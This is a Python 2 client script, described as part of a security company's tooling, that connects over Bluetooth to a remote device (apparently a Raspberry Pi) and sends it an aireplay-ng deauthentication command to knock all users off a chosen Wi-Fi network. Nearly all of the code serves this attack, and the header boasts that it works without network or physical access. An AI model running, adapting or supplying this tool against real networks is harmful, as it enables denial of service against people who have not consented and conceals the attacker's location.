''' Client side for deauth wifi attack. Run this on a device that can communicate with
bluetooth signals. any device that can do this that supports python will work.
this client allows us to connect to a bluetooth server and completely bump everyone of a wifi network,
without you needing access to the network, access to the physical computer that attacks, or even access
to any wifi. All communication is ported through 2 devices via BlueTooth.

developed by Felipe Garcia Diaz as part of the PYLOT SECURITY company. '''

import bluetooth
from bluetooth import *
import os

#decide whether or not you want to setup bluetooth services. this should only have to be ran once a boot process
print "init setup?"
setup = raw_input("[y/n]>> ").lower()

if setup == "y":
	os.system("sudo hciconfig hci0 up") #enable bluetooth on the hci0 card
	os.system("sudo hciconfig hci0 piscan") #enable piscan on hci0 interface
	os.system("sudo hciconfig -a hci0 | grep -i 'PSCAN *ISCAN'") #enable different scan forms
else:
	pass

#Print out all local devices that have bluetooth capabilities in the area
print "scanning for local devices..."
BT_near = discover_devices(lookup_names=True) #Device discoverer
print str(len(BT_near)) + " Local bluetooth devices found."

for name, addr in BT_near:
	print name + " | " + addr + " | Close by"

MAC = raw_input("Mac address of bluetooth device\n>> ") #mac address of bluetooth server
port = 3 #port, not to important what it is as long as its same as server

s = bluetooth.BluetoothSocket(bluetooth.RFCOMM) #configure bluetooth connection
s.connect((MAC, port)) #connect to server
print "connected!"

#send commands to raspberry pi without wifi using bluetooth
while 1:
	wifi_MAC= raw_input("[WIFI MAC ADDRESS]>> ")
	wifi_INT = raw_input("[INTERFACE TO USE]>> ")
	s.send("sudo aireplay-ng --deauth 0 -a " + wifi_MAC + " " + wifi_INT + " --ignore-negative-one") #death command using aircrack-ng framework
	raw_input("press enter to exit >> " ) #keep connection from closing
	s.close() #close connection
